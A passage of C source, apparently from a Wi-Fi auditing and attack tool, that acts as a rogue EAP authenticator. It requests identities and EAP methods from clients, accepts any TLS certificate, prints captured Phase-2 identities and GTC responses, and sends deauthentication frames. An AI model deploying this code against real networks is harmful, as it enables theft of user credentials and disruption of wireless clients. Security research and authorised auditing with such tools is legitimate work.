strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(essidstring[0] != 0)
	{
	if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
						zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
						essidstring, msg);
	else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
						zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
						essidstring, msg);
	else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
						zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
						essidstring, msg);
	}
else
	{
	if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
						zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
						msg);
	else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
						zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
						msg);
	else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						zeiger->client[0], zeiger->client[1], zeiger->client[2], zeiger->client[3], zeiger->client[4], zeiger->client[5],
						zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5],
						msg);
	}
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline char *eap_type2name(uint8_t type)
{
static char outstr[4];

switch(type)
	{
	case EAP_TYPE_PEAP:
		return "EAP-PEAP";
	case EAP_TYPE_TTLS:
		return "EAP-TTLS";
	case EAP_TYPE_TLS:
		return "EAP-TLS";
	case EAP_TYPE_NAK:
		return "NAK";
	case EAP_TYPE_GTC:
		return "GTC";
	case EAP_TYPE_MSEAP:
	case EAP_TYPE_MSCHAPV2:
		return "MSCHAPV2";
	case EAP_TYPE_NOTIFY:
		return "NOTIFY";
	case EAP_TYPE_PWD:
		return "EAP-PWD";
	case EAP_TYPE_SIM:
		return "EAP-SIM";
	case EAP_TYPE_AKA:
		return "EAP-AKA";
	case EAP_TYPE_AKA1:
		return "EAP-AKA'";
	case EAP_TYPE_MD5:
		return "EAP-MD5-CHALLENGE";
	default:
		sprintf(outstr, "%d", type);
		return outstr;
	}
return outstr;
}
/*===========================================================================*/
static inline char *strclean(char *str, int strlen)
{
static int c, p;
static char outstr[STATUSMSG_MAX];
if(strlen > STATUSMSG_MAX -1) strlen = STATUSMSG_MAX -1;
p = 0;
for(c = 0; c < strlen; c++)
	{
	if((str[c] < 0x20) || (str[c] > 0x7e)) outstr[p++] = '.';
	else if(str[c] == 0x5c)
		{
		if((p +2) >= (STATUSMSG_MAX -1)) break;
		outstr[p++] = 0x5c;
		outstr[p++] = 0x5c;
		}
	else outstr[p++] = str[c];
	if(p == (STATUSMSG_MAX -1)) break;
	}
outstr[p] = 0;
return outstr;
}
/*===========================================================================*/
static inline void process80211exteap_resp_id(uint16_t exteaplen)
{
static ownlist_t *zeiger;

if(exteaplen < EAPAUTH_SIZE) return;
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((eapreqflag == true) && (zeiger->eapctx.id == 0))
			{
			while(zeiger->eapctx.reqstate < eapreqentries)
				{
				if(eapreqlist[zeiger->eapctx.reqstate].mode == EAPREQLIST_MODE_TLS)
					{
					if(zeiger->eapctx.reqstate > 0)
						{
						zeiger->eapctx.reqstate--;
						continue;
						}
					else
						{
						while(++zeiger->eapctx.reqstate < eapreqentries)
							{
							if(eapreqlist[zeiger->eapctx.reqstate].mode == EAPREQLIST_MODE_TLS) continue;
							break;
							}
						}
					}
				zeiger->eapctx.id++;
				zeiger->eapctx.type = eapreqlist[zeiger->eapctx.reqstate].type;
				send_eap_request(zeiger->eapctx.id, eapreqlist[zeiger->eapctx.reqstate].type, eapreqlist[zeiger->eapctx.reqstate].data, eapreqlist[zeiger->eapctx.reqstate].length);
				break;
				}
			}
		if((zeiger->status &OW_EAP_RESP) != OW_EAP_RESP)
			{
			zeiger->status |= OW_EAP_RESP;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP RESPONSE ID");
			}
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_RESP;
	memcpy(zeiger->ap, macfrx->addr1, 6);
	memcpy(zeiger->client, macfrx->addr2, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP RESPONSE ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
		if(memcmp(zeiger->client, macfrx->addr1, 6) != 0) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_RESP) != OW_EAP_RESP)
			{
			zeiger->status |= OW_EAP_RESP;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
			}
		if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP RESPONSE ID");
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_REQ;
	memcpy(zeiger->ap, macfrx->addr2, 6);
	memcpy(zeiger->client, macfrx->addr1, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
	if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP RESPONSE ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap_req_id(uint16_t exteaplen)
{
static ownlist_t *zeiger;

if(exteaplen < EAPAUTH_SIZE) return;
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_REQ) != OW_EAP_REQ)
			{
			zeiger->status |= OW_EAP_REQ;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP REQUEST ID");
			}
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_REQ;
	memcpy(zeiger->ap, macfrx->addr1, 6);
	memcpy(zeiger->client, macfrx->addr2, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP REQUEST ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
		if(memcmp(zeiger->client, macfrx->addr1, 6) != 0) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if((zeiger->status &OW_EAP_REQ) != OW_EAP_REQ)
			{
			zeiger->status |= OW_EAP_REQ;
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
				}
			if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
			}
		if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP REQUEST ID");
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_REQ;
	memcpy(zeiger->ap, macfrx->addr2, 6);
	memcpy(zeiger->client, macfrx->addr1, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
	if((statusout &STATUS_EAP) == STATUS_EAP) printown(zeiger, "EAP REQUEST ID");
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
return;
}
/*===========================================================================*/
static inline int eapreqlist_gettype(eapctx_t *eapctx, uint8_t type)
{
static int i;
for(i = eapctx->reqstate; i < eapreqentries; i++)
	{
	if(eapreqlist[i].type == type)
		return i;
	}
return 0;
}
/*===========================================================================*/
static inline void process80211exteap_resp(uint16_t exteaplen)
{
static ownlist_t *zeiger;
static uint8_t *eapauthptr;
static exteap_t *exteap;
static eapctx_t *eapctx;
static int eapreqentry;
eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
char outstr[DEBUGMSG_MAX];

if(exteaplen < EAPAUTH_SIZE) return;
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
		zeiger->timestamp = timestamp;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(eapreqflag == true)
			{
			eapctx = &zeiger->eapctx;
			if(exteap->id > eapctx->id) return;
			if(eapctx->reqstate == eapreqentries) return;
			if((((exteap->type != EAP_TYPE_NAK) && ((statusout &STATUS_EAP) == STATUS_EAP)) || ((exteap->type == EAP_TYPE_NAK) && ((statusout &STATUS_EAP_NAK) == STATUS_EAP_NAK))) && (exteap->id == eapctx->id))
				{
#ifdef DEBUG_TLS
				if(exteap->type == EAP_TYPE_NAK)
					sprintf(outstr, "EAP RESPONSE TYPE NAK:%s EAPTIME:%" PRIu64 " ID:%d REQ:%d%s%s" , eap_type2name(exteap->data[0]), timestamp -lastauthtimestamp, exteap->id, zeiger->eapctx.reqstate, zeiger->eapctx.tlstun ? " TLS":"", (zeiger->eapctx.reqstate == (eapreqentries -1)) ? " FIN" : "");
				else
					sprintf(outstr, "EAP RESPONSE TYPE %s EAPTIME:%" PRIu64 " ID:%d REQ:%d%s%s" , eap_type2name(exteap->type), timestamp -lastauthtimestamp, exteap->id, zeiger->eapctx.reqstate, zeiger->eapctx.tlstun ? " TLS":"", (zeiger->eapctx.reqstate == (eapreqentries -1)) ? " FIN" : "");
#else
				if(exteap->type == EAP_TYPE_NAK)
					sprintf(outstr, "EAP RESPONSE TYPE NAK:%s EAPTIME:%" PRIu64 " REQ:%d%s%s" , eap_type2name(exteap->data[0]), timestamp -lastauthtimestamp, zeiger->eapctx.reqstate, zeiger->eapctx.tlstun ? " TLS":"", (zeiger->eapctx.reqstate == (eapreqentries -1)) ? " FIN" : "");
				else
					sprintf(outstr, "EAP RESPONSE TYPE %s EAPTIME:%" PRIu64 " REQ:%d%s%s" , eap_type2name(exteap->type), timestamp -lastauthtimestamp, zeiger->eapctx.reqstate, zeiger->eapctx.tlstun ? " TLS":"", (zeiger->eapctx.reqstate == (eapreqentries -1)) ? " FIN" : "");
#endif
				printown(zeiger, outstr);
				}
			if(eapreqlist[eapctx->reqstate].termination == 0)
				{
				if(eapctx->reqstate < (eapreqentries -1)) send_eap_status_resp(EAP_CODE_FAILURE, exteap->id, eapreqlist[eapctx->reqstate].type);
					else send_deauthentication2client(macfrx->addr2, macfrx->addr1, reasoncode);
				}
			else
				{
				if(eapreqlist[eapctx->reqstate].termination != EAPREQLIST_TERM_NOTERM)
					{
					if(eapreqlist[eapctx->reqstate].termination == EAPREQLIST_TERM_DEAUTH)
						send_deauthentication2client(macfrx->addr2, macfrx->addr1, reasoncode);
					else if(eapreqlist[eapctx->reqstate].termination == EAPREQLIST_TERM_ENDTLS)
						{
						if(eapctx->tlstun == true)
							{
							SSL_shutdown(eaptlsctx->ssl);
							send_eap_tls(eapctx, NULL, 0);
							SSL_free(eaptlsctx->ssl);
							eaptlsctx->ssl = NULL;
							eapctx->tlstun = false;
							}
						}
					else send_eap_status_resp(eapreqlist[eapctx->reqstate].termination, exteap->id, eapreqlist[eapctx->reqstate].type);
					}
				}
			if(exteap->id == eapctx->id)
				{
				if((exteap->type == EAP_TYPE_NAK) && (eapreqfollownakflag == true))
					{
					eapreqentry = eapreqlist_gettype(eapctx, exteap->data[0]);
					if(eapreqentry > 0) eapctx->reqstate = eapreqentry -1;
					}
				while(++eapctx->reqstate < eapreqentries)
					{
					if((eapreqlist[eapctx->reqstate].mode == EAPREQLIST_MODE_TLS) && (eapctx->tlstun == false)) continue;
					eapctx->id++;
					eapctx->type = eapreqlist[eapctx->reqstate].type;
					send_eap_request(eapctx->id, eapreqlist[eapctx->reqstate].type, eapreqlist[eapctx->reqstate].data, eapreqlist[eapctx->reqstate].length);
					break;
					}
				if(eapctx->reqstate == eapreqentries)
					{
					send_deauthentication2client(macfrx->addr2, macfrx->addr1, WLAN_REASON_IEEE_802_1X_AUTH_FAILED);	
					}
				}
			}
		return;
		}
	memset(zeiger, 0, OWNLIST_SIZE);
	zeiger->timestamp = timestamp;
	zeiger->status = OW_EAP_RESP;
	memcpy(zeiger->ap, macfrx->addr1, 6);
	memcpy(zeiger->client, macfrx->addr2, 6);
	if(filtermode != 0)
		{
		if(setclientfilter(zeiger) == true)
			{
			qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
			return;
			}
		}
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	if((((exteap->type != EAP_TYPE_NAK) && ((statusout &STATUS_EAP) == STATUS_EAP)) || ((exteap->type == EAP_TYPE_NAK) && ((statusout &STATUS_EAP_NAK) == STATUS_EAP_NAK))))
		{
		sprintf(outstr, "EAP RESPONSE TYPE %s", eap_type2name(exteap->type));
		printown(zeiger, outstr);
		}
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return;
	}
return;
}
/*===========================================================================*/
static inline int eap_tls_clientverify_cb(int preverify_ok, X509_STORE_CTX *x509_store_ctx)
{
(void)preverify_ok;
(void)x509_store_ctx;
return 1;
}
/*===========================================================================*/
static inline void process80211exteaptls_resp_eap(ownlist_t *ownzeiger, uint8_t *data, int data_len)
{
static exteap_t *eapin;
int eapinlen;
eapctx_t *eapctx = &ownzeiger->eapctx;
static char outstr[EAP_LEN_MAX];

if((data_len <= 0) && (eapctx->inner_id == 0))
	{
	send_eap_tls_eap_request(eapctx, eapctx->inner_id, EAP_TYPE_ID, NULL, 0);
	eapctx->inner_type = EAP_TYPE_ID;
	return;
	}
eapin = (exteap_t*)data;
eapinlen = (int)ntohs(eapin->len);
if(eapinlen != data_len) return;
if(eapin->code == EAP_CODE_RESP)
	{
	if(eapin->id != eapctx->inner_id) return;
	if((eapin->type != eapctx->inner_type) && (eapin->type != EAP_TYPE_NAK)) return;
	if(eapin->type == EAP_TYPE_ID)
		{
		if((statusout &STATUS_EAP) == STATUS_EAP)
			{
			snprintf(outstr, EAP_LEN_MAX, "EAP RESPONSE Phase2 TYPE ID:'%s' EAPTIME:%" PRIu64 " REQ:%d%s", strclean((char*)&eapin->data[0], data_len -EXTEAP_SIZE), timestamp -lastauthtimestamp, ownzeiger->eapctx.reqstate, (ownzeiger->eapctx.reqstate == eapreqentries) ? " FIN" : "");
			printown(ownzeiger, outstr);
			}
		}
	else if(eapin->type == EAP_TYPE_GTC)
		{
		if((statusout &STATUS_EAP) == STATUS_EAP)
			{
			snprintf(outstr, EAP_LEN_MAX, "EAP RESPONSE Phase2 TYPE GTC:'%s' EAPTIME:%" PRIu64 " REQ:%d%s", strclean((char*)&eapin->data[0], data_len -EXTEAP_SIZE), timestamp -lastauthtimestamp, ownzeiger->eapctx.reqstate, (ownzeiger->eapctx.reqstate == eapreqentries) ? " FIN" : "");
			printown(ownzeiger, outstr);
			}
		}
	else
		{
		if((((eapin->type != EAP_TYPE_NAK) && ((statusout &STATUS_EAP) == STATUS_EAP)) || ((eapin->type == EAP_TYPE_NAK) && ((statusout &STATUS_EAP_NAK) == STATUS_EAP_NAK))))
			{
			snprintf(outstr, EAP_LEN_MAX, "EAP RESPONSE Phase2 TYPE %s EAPTIME:%" PRIu64 " REQ:%d%s", eap_type2name(eapin->type), timestamp -lastauthtimestamp, ownzeiger->eapctx.reqstate, (ownzeiger->eapctx.reqstate == eapreqentries) ? " FIN" : "");
			printown(ownzeiger, outstr);
			}
		}
	if(eapreqlist[ownzeiger->eapctx.reqstate].termination == 0)
		{
		if(ownzeiger->eapctx.reqstate < (eapreqentries -1)) send_eap_tls_eap(eapctx, EAP_CODE_FAILURE, eapin->id, eapreqlist[ownzeiger->eapctx.reqstate].type, NULL, 0);
			else send_deauthentication2client(macfrx->addr2, macfrx->addr1, reasoncode);
		}
	else
		{
		if(eapreqlist[ownzeiger->eapctx.reqstate].termination != EAPREQLIST_TERM_NOTERM)
			{
			if(eapreqlist[ownzeiger->eapctx.reqstate].termination == EAPREQLIST_TERM_DEAUTH)
					send_deauthentication2client(macfrx->addr2, macfrx->addr1, reasoncode);
			else if(eapreqlist[ownzeiger->eapctx.reqstate].termination == EAPREQLIST_TERM_ENDTLS)
				{
				SSL_shutdown(eaptlsctx->ssl);
				send_eap_tls(eapctx, NULL, 0);
				send_eap_status_resp(EAP_CODE_FAILURE, eapctx->id, eapctx->type);
				eapctx->tlstun = false;
				while(++ownzeiger->eapctx.reqstate < eapreqentries)
					{
					if(eapreqlist[ownzeiger->eapctx.reqstate].mode == EAPREQLIST_MODE_TLS) continue;
					eapctx->id++;
					eapctx->type = eapreqlist[ownzeiger->eapctx.reqstate].type;
					send_eap_request(eapctx->id, eapreqlist[ownzeiger->eapctx.reqstate].type, eapreqlist[ownzeiger->eapctx.reqstate].data, eapreqlist[ownzeiger->eapctx.reqstate].length);
					break;
					}
				if(ownzeiger->eapctx.reqstate == eapreqentries)
					{
					send_deauthentication2client(macfrx->addr2, macfrx->addr1, WLAN_REASON_IEEE_802_1X_AUTH_FAILED);
					}
				return;
				}
			else send_eap_tls_eap(eapctx, eapreqlist[ownzeiger->eapctx.reqstate].termination, eapin->id, eapin->type, NULL, 0);
			}
		}
	ownzeiger->eapctx.reqstate++;
	if(ownzeiger->eapctx.reqstate < eapreqentries)
		{
		eapctx->inner_id++;
		eapctx->inner_type = eapreqlist[ownzeiger->eapctx.reqstate].type;
		send_eap_tls_eap_request(eapctx, eapctx->inner_id, eapreqlist[ownzeiger->eapctx.reqstate].type, eapreqlist[ownzeiger->eapctx.reqstate].data, eapreqlist[ownzeiger->eapctx.reqstate].length);
		}
	else
		{
		SSL_shutdown(eaptlsctx->ssl);
		send_eap_tls(eapctx, NULL, 0);
		eapctx->tlstun = false;
		send_deauthentication2client(macfrx->addr2, macfrx->addr1, WLAN_REASON_IEEE_802_1X_AUTH_FAILED);
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap_resp_tls(uint16_t exteaplen)
{
static ownlist_t *zeiger;
static uint8_t *eapauthptr;
static exteap_t *exteap;
static exteap_t *outexteap;
eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
int tlsdataoffset;
size_t tlsdatalen;
static char outstr[STATUSMSG_MAX];
static uint8_t tlsflags;
static uint8_t inbuf[65536];
static uint16_t inbuflen;
eapctx_t *eapctx;
static int res, err;
static unsigned long tlserror;
static bool tlsabort;

if(exteaplen < EAPAUTH_SIZE) return;
if((timestamp -lastauthtimestamp) > eapoleaptimeoutvalue) return;
if(memcmp(&lastauthap, macfrx->addr1, 6) != 0) return;
if(!((macfrx->to_ds == 1) && (macfrx->from_ds == 0))) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if((memcmp(zeiger->ap, macfrx->addr1, 6) != 0) || (memcmp(zeiger->client, macfrx->addr2, 6) != 0)) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	eapctx = &zeiger->eapctx;
	if(((eapctx->tlstun == false) && (eaptlsctx->ssl != NULL)) || ((eapctx->tlstun == true) && ((timestamp -zeiger->timestamp) > EAPTLS_TIMEOUT)))
		{
		SSL_free(eaptlsctx->ssl);
		eaptlsctx->ssl = NULL;
		eapctx->tlstun = false;
		}
	zeiger->timestamp = timestamp;
	if((fd_pcapng > 0) && ((eaptlsctx->ssl == NULL) || (SSL_is_init_finished(eaptlsctx->ssl) == 0)))
		{
		if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
		}
	if(exteaplen <= EXTEAP_SIZE) return;
	tlsflags = exteap->data[0];
	if(exteap->id != eapctx->id) return;
	if(eaptlsctx->ssl == NULL)
		{
		eaptlsctx->ssl = SSL_new(tlsctx);
		SSL_set_accept_state(eaptlsctx->ssl);
		eaptlsctx->tls_in = BIO_new(BIO_s_mem());
		eaptlsctx->tls_out = BIO_new(BIO_s_mem());
		eapctx->version = ((tlsflags &EAP_TLSFLAGS_VERSION));
		SSL_set_bio(eaptlsctx->ssl, eaptlsctx->tls_in, eaptlsctx->tls_out);
		if((((exteap->type != EAP_TYPE_NAK) && ((statusout &STATUS_EAP) == STATUS_EAP)) || ((exteap->type == EAP_TYPE_NAK) && ((statusout &STATUS_EAP_NAK) == STATUS_EAP_NAK))))
			{
#ifdef DEBUG_TLS
			sprintf(outstr, "EAP RESPONSE TYPE %s EAPTIME:%" PRIu64 " ID:%d REQ:%d TLSSTART", eap_type2name(exteap->type), timestamp -lastauthtimestamp, exteap->id, zeiger->eapctx.reqstate);
#else
			sprintf(outstr, "EAP RESPONSE TYPE %s EAPTIME:%" PRIu64 " REQ:%d", eap_type2name(exteap->type), timestamp -lastauthtimestamp, zeiger->eapctx.reqstate);
#endif
			printown(zeiger, outstr);
			}
		eapctx->tlstun = true;
		}
	if((SSL_in_init(eaptlsctx->ssl) == false) && (SSL_is_init_finished(eaptlsctx->ssl) == false))
		{
		SSL_do_handshake(eaptlsctx->ssl);
		}

	tlsdataoffset = EAP_TLSFLAGS_SIZE;
	if((tlsflags &EAP_TLSFLAGS_LENGTH_INCL) == EAP_TLSFLAGS_LENGTH_INCL)
		{
			memcpy(&eaptlsctx->tlslen, &exteap->data[EAP_TLSFLAGS_SIZE], EAP_TLSLENGTH_SIZE);
			eaptlsctx->tlslen = ntohl(eaptlsctx->tlslen);
			tlsdataoffset += EAP_TLSLENGTH_SIZE;
		}
	tlsdatalen = exteaplen -EXTEAP_SIZE -tlsdataoffset;

	if(eaptlsctx->fragments_tx == true)
		{
		eaptlsctx->buflen = eaptlsctx->tlslen -eaptlsctx->txpos +EAP_TLSFLAGS_SIZE +EAP_TLSLENGTH_SIZE;
		if(eaptlsctx->buflen < (EAP_LEN_MAX -EXTEAP_SIZE -EAP_TLSFLAGS_SIZE))
			{
			tlsflags &= ~(EAP_TLSFLAGS_MORE_FRAGMENTS | EAP_TLSFLAGS_LENGTH_INCL);
			eaptlsctx->fragments_tx = false;
			eaptlsctx->tlslen = 0;
			}
		else
			{
			tlsflags |= (EAP_TLSFLAGS_MORE_FRAGMENTS);
			eaptlsctx->buflen = EAP_LEN_MAX -EXTEAP_SIZE -EAP_TLSFLAGS_SIZE -EAP_TLSLENGTH_SIZE;
			}
		
		eaptlsctx->buf[eaptlsctx->txpos -EAP_TLSFLAGS_SIZE] = tlsflags;
		eapctx->id++;
		send_eap_request(eapctx->id, eapctx->type, &eaptlsctx->buf[eaptlsctx->txpos -EAP_TLSFLAGS_SIZE], eaptlsctx->buflen +EAP_TLSFLAGS_SIZE);
#ifdef DEBUG_TLS
		snprintf(debugmsg, DEBUGMSG_MAX, "TLS out sending next fragment len=%d", (int)eaptlsctx->buflen);
		debugprint(0, NULL, debugmsg);
#endif
		eaptlsctx->txpos += eaptlsctx->buflen;
		return;
		}

	if((eaptlsctx->buflen +tlsdatalen) > EAPTLSCTX_BUF_SIZE)
		{
#ifdef DEBUG_TLS
		snprintf(debugmsg, DEBUGMSG_MAX, "TLS received cumulative data len=%d > EAPTLSCTX_BUF_SIZE=%d", (int)(eaptlsctx->buflen +tlsdatalen), EAPTLSCTX_BUF_SIZE);
		debugprint(0, NULL, debugmsg);
#endif
		return;
		}
	memcpy(&eaptlsctx->buf[eaptlsctx->buflen], &exteap->data[tlsdataoffset], tlsdatalen);
	eaptlsctx->buflen += tlsdatalen;
	if((tlsflags &EAP_TLSFLAGS_MORE_FRAGMENTS) == EAP_TLSFLAGS_MORE_FRAGMENTS)
		{
		eaptlsctx->fragments_rx = true;
		eapctx->id++;
		send_eap_request(eapctx->id, eapctx->type, NULL, 0);
		return;
		}
#ifdef DEBUG_TLS
	if((eaptlsctx->tlslen > 0) && (eaptlsctx->buflen != eaptlsctx->tlslen))
		{
